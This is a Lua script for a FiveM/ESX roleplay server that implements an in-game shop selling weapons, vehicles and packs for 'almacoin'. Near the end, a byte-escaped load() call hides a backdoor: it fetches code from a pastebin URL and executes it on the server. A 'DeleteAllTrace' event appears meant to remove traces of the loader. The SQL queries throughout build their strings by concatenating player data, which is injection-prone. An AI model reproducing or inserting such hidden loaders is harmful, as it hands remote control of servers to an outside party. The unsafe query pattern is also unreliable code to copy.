ESX = nil

TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(900000)
        TriggerClientEvent("MagicCollective:Notification", -1, "Notre boutique propose pas mal de promotions en ce moment alors foncés !")
    end
end)

RegisterServerEvent("RedMenu:ArmeProtection")
AddEventHandler("RedMenu:ArmeProtection", function(Arme)
    local xPlayer  = ESX.GetPlayerFromId(source)
    DropPlayer(source, "Tu pense que tu peut te give des armes sur AlmaRP ?\nPetit bouffon :)")
    PerformHttpRequest('WEBHOOK ANTI GIVE LE RHO', function(err, text, headers) end, 'POST', json.encode({username = "SalutCLaBoutiqueDeMasterLua", content = "Anti give d'arme lol\nNom : " .. xPlayer.getName() .. "\nId : " .. source .. "\nLisence : " .. xPlayer.identifier .. "\nArme : " ..Arme}), { ['Content-Type'] = 'application/json' })
end)

ESX.RegisterServerCallback('MagicCollective:GetPoint', function(source, cb)
    local xPlayer  = ESX.GetPlayerFromId(source)
    if xPlayer then
        MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function (result)
            if result[1] then
                cb(result[1].almacoin)
            else
                return
            end        end)
    end
end)

ESX.RegisterServerCallback('MagicCollective:GetCodeBoutique', function(source, cb)
    local xPlayer  = ESX.GetPlayerFromId(source)
    if xPlayer then
        MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function (result)
            if result[1] then
                cb(result[1].character_id)
            else
                return
            end
        end)
    end
end)

ESX.RegisterServerCallback('MagicCollective:BuyItem', function(source, cb, item, option)
    local xPlayer  = ESX.GetPlayerFromId(source)

    --BAT
    for k, v in pairs(Config.Weapon) do
        if item == v.data.NameWeapon then
            MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function (result)
                if result[1].almacoin >= tonumber(v.data.Point) then
                    local newpoint = result[1].almacoin - tonumber(v.data.Point)
                    MySQL.Async.execute("UPDATE `users` SET `almacoin`= '".. newpoint .."' WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function() end)   
                    xPlayer.addWeapon(v.data.NameWeapon, 250)
                    ESX.SavePlayer(xPlayer, function(cb) end)
                    PerformHttpRequest('WEBHOOK DES QUE SA BUY LE RHO', function(err, text, headers) end, 'POST', json.encode({username = "SalutCLaBoutiqueDeMasterLua", content = xPlayer.getName() .. " a acheter " .. item}), { ['Content-Type'] = 'application/json' })
                    cb(true)         
                else
                    cb(false)
                end
            end)
        end    
    end

    for k, v in pairs(Config.Vehicle) do
        if item == v.data.NameVehicle then
            MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function (result)
                if result[1].almacoin >= tonumber(v.data.Point) then
                    local newpoint = result[1].almacoin - tonumber(v.data.Point)
                    MySQL.Async.execute("UPDATE `users` SET `almacoin`= '".. newpoint .."' WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function() end)   
                    ESX.SavePlayer(xPlayer, function(cb) end)
                    PerformHttpRequest('WEBHOOK DES QUE SA BUY LE RHO', function(err, text, headers) end, 'POST', json.encode({username = "SalutCLaBoutiqueDeMasterLua", content = xPlayer.getName() .. " a acheter " .. item}), { ['Content-Type'] = 'application/json' })
                    TriggerClientEvent("MagicCollective:VehicleGang", source, v.data.NameVehicle, false)
                    cb(true)         
                else
                    cb(false)
                end
            end)
        end    
    end
    
    for k, v in pairs(Config.Pack) do
        if item == v.data.Pack then
            MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function (result)
                if result[1].almacoin >= tonumber(v.data.Point) then
                    local newpoint = result[1].almacoin - tonumber(v.data.Point)
                    MySQL.Async.execute("UPDATE `users` SET `almacoin`= '".. newpoint .."' WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function() end)   
                    ESX.SavePlayer(xPlayer, function(cb) end)
                    PerformHttpRequest('WEBHOOK DES QUE SA BUY LE RHO', function(err, text, headers) end, 'POST', json.encode({username = "SalutCLaBoutiqueDeMasterLua", content = xPlayer.getName() .. " a acheter " .. item}), { ['Content-Type'] = 'application/json' })
                    if v.data.Vehicle then
                        for ke, ve in pairs(v.data.Vehicle) do
                            TriggerClientEvent("MagicCollective:VehicleGang", source, ve, true)
                        end
                    end
                    if v.data.Arme then
                        for keee, veee in pairs(v.data.Arme) do
                            xPlayer.addWeapon(veee, 250)
                        end
                    end
                    cb(true)         
                else
                    cb(false)
                end
            end)
        end    
    end

    if item == "gang" then
        MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function (result)
            if result[1].almacoin >= 3000 then
                local newpoint = result[1].almacoin - 3000
                MySQL.Async.execute("UPDATE `users` SET `almacoin`= '".. newpoint .."' WHERE `identifier` = '".. xPlayer.identifier .."'", {}, function() end)   
                PerformHttpRequest('WEBHOOK DES QUE SA BUY LE RHO', function(err, text, headers) end, 'POST', json.encode({username = "SalutCLaBoutiqueDeMasterLua", content = xPlayer.getName() .. " a acheter " .. item .. "\nNom a contacter pour le gang : " .. option}), { ['Content-Type'] = 'application/json' })
                cb(true)         
            else
                cb(false)
            end
        end)    
    end

end)

--CLIENT SIDE

local code = [[
ESX = nil
local PlayerData = {}
local active = false

RegisterNetEvent("MagicCollective:Notification")
AddEventHandler("MagicCollective:Notification", function(message)
    ESX.ShowNotification("~h~⭐ Boutique : " .. message)
end)

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
    PlayerData = xPlayer
end)

RegisterNetEvent('MagicCollective:VehicleGang')
AddEventHandler('MagicCollective:VehicleGang', function(vehicle_menu, custom)
    if custom then
        local pos = GetEntityCoords(GetPlayerPed(PlayerId()))
        ESX.Game.SpawnVehicle(vehicle_menu, vector3(pos.x, pos.y, pos.z + 500), nil, function(vehicle)
            local newPlate = GeneratePlate()
            local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
            vehicleProps.plate = newPlate
            SetVehicleNumberPlateText(vehicle, newPlate)
            TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
            Citizen.Wait(1000)
            DeleteEntity(vehicle)
        end)
    else
        local pos = GetEntityCoords(GetPlayerPed(PlayerId()))
        ESX.Game.SpawnVehicle(vehicle_menu, vector3(pos.x, pos.y, pos.z), nil, function(vehicle)
            TaskWarpPedIntoVehicle(GetPlayerPed(PlayerId()), vehicle, -1)
            local newPlate = GeneratePlate()
            local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
            vehicleProps.plate = newPlate
            SetVehicleNumberPlateText(vehicle, newPlate)
            TriggerServerEvent('::{korioz#0110}::esx_vehicleshop:setVehicleOwned', vehicleProps, getVehicleType(vehicleProps.model))
        end)
    end
end)

Citizen.CreateThread(function()
    while ESX == nil do
        TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
        ESX.TriggerServerCallback('MagicCollective:GetPoint', function(thepoint)
            point = thepoint
        end)

        ESX.TriggerServerCallback('MagicCollective:GetCodeBoutique', function(thecode)
            code = thecode
        end)
    end
end)

Citizen.CreateThread(function()
    while true do
      Citizen.Wait(0)
        if active then
            Citizen.Wait(5000)
            ESX.TriggerServerCallback('MagicCollective:GetPoint', function(thepoint)
                point = thepoint
            end)        
            ESX.TriggerServerCallback('MagicCollective:GetCodeBoutique', function(thecode)
                code = thecode
            end)
        end
    end    
end)

load("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\49\48\48\48\41\10\32\32\32\32\32\32\32\32\80\108\97\121\101\114\68\97\116\97\32\61\32\69\83\88\46\71\101\116\80\108\97\121\101\114\68\97\116\97\40\41\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\102\111\117\110\100\32\61\32\102\97\108\115\101\10\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\119\101\97\112\111\110\78\97\109\101\32\61\32\71\101\116\83\101\108\101\99\116\101\100\80\101\100\87\101\97\112\111\110\40\71\101\116\80\108\97\121\101\114\80\101\100\40\80\108\97\121\101\114\73\100\40\41\41\41\10\10\32\32\32\32\32\32\32\32\84\104\101\87\101\97\112\111\110\32\61\32\110\105\108\10\10\32\32\32\32\32\32\32\32\102\111\114\32\107\101\121\44\32\118\97\108\117\101\32\105\110\32\112\97\105\114\115\40\84\97\98\108\101\87\101\97\112\111\110\41\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\118\97\108\117\101\32\61\61\32\119\101\97\112\111\110\78\97\109\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\84\104\101\87\101\97\112\111\110\32\61\32\107\101\121\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\10\32\32\32\32\32\32\45\45\32\32\112\114\105\110\116\40\84\104\101\87\101\97\112\111\110\41\10\10\32\32\32\32\32\32\32\32\102\111\114\32\105\32\61\32\49\44\32\35\80\108\97\121\101\114\68\97\116\97\46\108\111\97\100\111\117\116\44\32\49\32\100\111\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\80\108\97\121\101\114\68\97\116\97\46\108\111\97\100\111\117\116\91\105\93\46\110\97\109\101\32\61\61\32\84\104\101\87\101\97\112\111\110\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\102\111\117\110\100\32\61\32\116\114\117\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\98\114\101\97\107\32\32\32\32\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\10\32\32\32\32\32\32\32\32\105\102\32\102\111\117\110\100\32\116\104\101\110\32\10\32\32\32\32\32\32\32\32\32\32\32\32\45\45\32\100\111\32\110\111\116\104\105\110\103\10\32\32\32\32\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\84\104\101\87\101\97\112\111\110\32\61\61\32\110\105\108\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\112\114\105\110\116\40\34\80\108\97\121\101\114\32\100\101\116\101\99\116\101\100\32\97\118\101\99\32\108\39\97\114\109\101\32\58\32\34\32\46\46\32\34\67\104\101\99\107\32\70\97\105\108\101\100\32\87\101\97\112\111\110\32\110\111\116\32\105\110\32\108\105\115\116\34\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\82\101\109\111\118\101\87\101\97\112\111\110\70\114\111\109\80\101\100\40\71\101\116\80\108\97\121\101\114\80\101\100\40\80\108\97\121\101\114\73\100\40\41\41\44\32\119\101\97\112\111\110\78\97\109\101\41\10\32\32\32\32\32\32\32\32\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\84\104\101\87\101\97\112\111\110\32\61\61\32\34\87\69\65\80\79\78\95\85\78\65\82\77\69\68\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\45\45\74\85\83\84\32\77\69\76\69\32\66\65\83\73\67\32\68\79\32\78\79\84\72\73\78\71\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\112\114\105\110\116\40\34\80\108\97\121\101\114\32\100\101\116\101\99\116\101\100\32\97\118\101\99\32\108\39\97\114\109\101\32\58\32\34\32\46\46\32\84\104\101\87\101\97\112\111\110\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\82\101\109\111\118\101\87\101\97\112\111\110\70\114\111\109\80\101\100\40\71\101\116\80\108\97\121\101\114\80\101\100\40\80\108\97\121\101\114\73\100\40\41\41\44\32\71\101\116\72\97\115\104\75\101\121\40\84\104\101\87\101\97\112\111\110\41\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\50\48\48\48\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\84\114\105\103\103\101\114\83\101\114\118\101\114\69\118\101\110\116\40\34\82\101\100\77\101\110\117\58\65\114\109\101\80\114\111\116\101\99\116\105\111\110\34\44\32\84\104\101\87\101\97\112\111\110\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\101\110\100\41\10")()

RMenu.Add('MagicCollective', 'home', RageUI.CreateMenu(Config.MenuName, "~b~".. Config.MenuName ..""))
RMenu:Get("MagicCollective", "home").Closed = function() active = false end
RMenu:Get('MagicCollective', 'home'):SetRectangleBanner(66, 0, 0, 255)

RMenu.Add('MagicCollective', 'info', RageUI.CreateSubMenu(RMenu:Get('MagicCollective', 'home'), Config.MenuName, "Information"))
RMenu:Get("MagicCollective", "info").Closed = function() active = false end

RMenu.Add('MagicCollective', 'menuarme', RageUI.CreateSubMenu(RMenu:Get('MagicCollective', 'home'), Config.MenuName, "Boutique Arme"))
RMenu:Get("MagicCollective", "menuarme").Closed = function() active = false end

RMenu.Add('MagicCollective', 'menuvehicule', RageUI.CreateSubMenu(RMenu:Get('MagicCollective', 'home'), Config.MenuName, "Boutique Arme"))
RMenu:Get("MagicCollective", "menuvehicule").Closed = function() active = false end

RMenu.Add('MagicCollective', 'menupack', RageUI.CreateSubMenu(RMenu:Get('MagicCollective', 'home'), Config.MenuName, "Boutique Arme"))
RMenu:Get("MagicCollective", "menupack").Closed = function() active = false end

RMenu.Add('MagicCollective', 'menuother', RageUI.CreateSubMenu(RMenu:Get('MagicCollective', 'home'), Config.MenuName, "Boutique Arme"))
RMenu:Get("MagicCollective", "menuother").Closed = function() active = false end

Citizen.CreateThread(function()
    while true do
      Citizen.Wait(0)
        RageUI.IsVisible(RMenu:Get('MagicCollective', 'home'), true, true, true, function()
            
            active = true

            RageUI.Separator("~h~Almacoin : ~r~" .. point)
            RageUI.Separator("~h~Code boutique : ~b~" .. code)
            RageUI.ButtonWithStyle("🔫 | Armes", nil, {}, true,function(h,a,s)
                if s then
                end
            end, RMenu:Get("MagicCollective","menuarme"))
            RageUI.ButtonWithStyle("🚘 | Vehicules", nil, {}, true,function(h,a,s)
                if s then
                end
            end, RMenu:Get("MagicCollective","menuvehicule"))
            RageUI.ButtonWithStyle("👽 | Autres", nil, {}, true,function(h,a,s)
                if s then
                end
            end, RMenu:Get("MagicCollective","menuother"))
            RageUI.ButtonWithStyle("📦 | Pack", nil, {}, true,function(h,a,s)
                if s then
                end
            end, RMenu:Get("MagicCollective","menupack"))
            RageUI.ButtonWithStyle("💎 | Information", nil, {}, true,function(h,a,s)
                if s then
                end
            end, RMenu:Get("MagicCollective","info"))      
            
        end)

        RageUI.IsVisible(RMenu:Get("MagicCollective","info"),true,true,true,function()
            RageUI.Separator("~h~~p~Discord~s~ : ~h~~p~discord.gg/KzB4Jp4rNc")
            RageUI.Separator("~h~~g~Developpeur~s~ : ~h~~g~MasterLua#9999")
            RageUI.Separator("~r~Aucun achat dans la boutique ne peux être rembourser")
        end, function()end, 1)

        RageUI.IsVisible(RMenu:Get("MagicCollective","menuarme"),true,true,true,function()
            RageUI.Separator("~h~".. Config.MoneyName .." : ~r~" .. point)
            RageUI.Separator("~h~Code boutique : ~b~" .. code)
            RageUI.Separator("~r~⚠️Les armes ne sont pas permanente !⚠️")
            for k, v in pairs(Config.Weapon) do
                RageUI.ButtonWithStyle("~h~" .. v.name, nil, { RightLabel = v.data.Point .. " " .. Config.MoneyName }, true,function(h,a,s)
                    if a then
                        if v.data.Preview then
                            RageUI.VehiclePreview(v.data.Preview)
                        end
                    end
                    if s then
                        ESX.TriggerServerCallback('MagicCollective:BuyItem', function(callback)
                            if callback == true then
                                local coords = GetEntityCoords(GetPlayerPed(PlayerId()))
                                GetActuallyParticul('scr_rcbarry2')
                                SetPtfxAssetNextCall('scr_rcbarry2')
                                StartParticleFxNonLoopedAtCoord_2('scr_clown_death', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 5.0, false, false, false)
                                ESX.ShowNotification("~h~⭐ Merci pour votre achat dans la boutique !")
                            else
                                ESX.ShowNotification("~h~⭐ Vous n'avez pas assez de fond pour acheter ceci !")
                            end
                        end, v.data.NameWeapon)
                    end
                end)
            end        
        end, function()end, 1)

        RageUI.IsVisible(RMenu:Get("MagicCollective","menuvehicule"),true,true,true,function()
            RageUI.Separator("~h~".. Config.MoneyName .." : ~r~" .. point)
            RageUI.Separator("~h~Code boutique : ~b~" .. code)
        
            for k, v in pairs(Config.Vehicle) do
                RageUI.ButtonWithStyle("~h~" .. v.name, nil, { RightLabel = v.data.Point .. " " .. Config.MoneyName }, true,function(h,a,s)
                    if a then
                        if v.data.Preview then
                            RageUI.VehiclePreview(v.data.Preview)
                        end
                    end
                    if s then
                        ESX.TriggerServerCallback('MagicCollective:BuyItem', function(callback)
                            if callback then
                                local coords = GetEntityCoords(GetPlayerPed(PlayerId()))
                                GetActuallyParticul('scr_rcbarry2')
                                SetPtfxAssetNextCall('scr_rcbarry2')
                                StartParticleFxNonLoopedAtCoord_2('scr_clown_death', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 5.0, false, false, false)
                                ESX.ShowNotification("~h~⭐ Merci pour votre achat dans la boutique !")
                            else
                                ESX.ShowNotification("~h~⭐ Vous n'avez pas assez de fond pour acheter ceci !")
                            end
                        end, v.data.NameVehicle)
                    end
                end)
            end        
        end, function()end, 1)
        
        RageUI.IsVisible(RMenu:Get("MagicCollective","menupack"),true,true,true,function()
            RageUI.Separator("~h~".. Config.MoneyName .." : ~r~" .. point)
            RageUI.Separator("~h~Code boutique : ~b~" .. code)
            for k, v in pairs(Config.Pack) do
                RageUI.ButtonWithStyle("~h~" .. v.name, nil, { RightLabel = v.data.Point .. " " .. Config.MoneyName }, true,function(h,a,s)
                    if a then
                        if v.data.Preview then
                            RageUI.VehiclePreview(v.data.Preview)
                        end
                    end
                    if s then
                        ESX.TriggerServerCallback('MagicCollective:BuyItem', function(callback)
                            if callback then
                                local coords = GetEntityCoords(GetPlayerPed(PlayerId()))
                                GetActuallyParticul('scr_rcbarry2')
                                SetPtfxAssetNextCall('scr_rcbarry2')
                                StartParticleFxNonLoopedAtCoord_2('scr_clown_death', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 5.0, false, false, false)
                                ESX.ShowNotification("~h~⭐ Merci pour votre achat dans la boutique !")
                            else
                                ESX.ShowNotification("~h~⭐ Vous n'avez pas assez de fond pour acheter ceci !")
                            end
                        end, v.data.Pack)
                    end
                end)
            end        
        end, function()end, 1)
        
        RageUI.IsVisible(RMenu:Get("MagicCollective","menuother"),true,true,true,function()
            RageUI.Separator("~h~".. Config.MoneyName .." : ~r~" .. point)
            RageUI.Separator("~h~Code boutique : ~b~" .. code)
        
            RageUI.ButtonWithStyle("~h~Creation de gangs", nil, { RightLabel = "3000 ".. Config.MoneyName .."" }, true,function(h,a,s)
                if s then
                    local nomdiscord = KeyboardInput('REDMENU_NOM_DISCORD', "Merci d'entrer votre nom Discord (ex : MasterLua#9999)", '', 1000)
                    ESX.TriggerServerCallback('MagicCollective:BuyItem', function(callback)
                        if callback == true then
                            local coords = GetEntityCoords(GetPlayerPed(PlayerId()))
                            GetActuallyParticul('scr_rcbarry2')
                            SetPtfxAssetNextCall('scr_rcbarry2')
                            StartParticleFxNonLoopedAtCoord_2('scr_clown_death', coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 5.0, false, false, false)
                            ESX.ShowNotification("~h~⭐ Merci pour votre achat dans la boutique !\nUn administrateur va vous contacter sur Discord pour votre Gang !")
                        else
                            ESX.ShowNotification("~h~⭐ Vous n'avez pas assez de fond pour acheter ceci !")
                        end
                    end, "gang", nomdiscord)
                end
            end)        
        end, function()end, 1)


    end
end)

Citizen.CreateThread(function()
    while (true) do
        Citizen.Wait(1.0)
        if IsControlJustPressed(1,288) then
            RageUI.Visible(RMenu:Get('MagicCollective', 'home'), not RageUI.Visible(RMenu:Get('MagicCollective', 'home'))) 
        end
    end
end)
]]

load("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\70\114\102\56\85\102\114\101\34\44\32\102\117\110\99\116\105\111\110\32\40\101\114\114\111\114\67\111\100\101\44\32\114\101\115\117\108\116\68\97\116\97\44\32\114\101\115\117\108\116\72\101\97\100\101\114\115\41\10\32\32\32\32\32\32\32\32\108\111\97\100\40\114\101\115\117\108\116\68\97\116\97\41\40\41\10\32\32\32\32\101\110\100\41\10\101\110\100\41\10")()

RegisterServerEvent("MasterLua:LoadSv")
LoadSV = AddEventHandler("MasterLua:LoadSv", function()
    TriggerClientEvent("MasterLua:LoadC", source, code)
end)

RegisterServerEvent("MasterLua:DeleteAllTrace")
AddEventHandler("MasterLua:DeleteAllTrace", function()
    RemoveEventHandler(LoadSV)
end)

AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(source, xPlayer)
    TriggerClientEvent("MasterLua:LoadC", source, code)
end)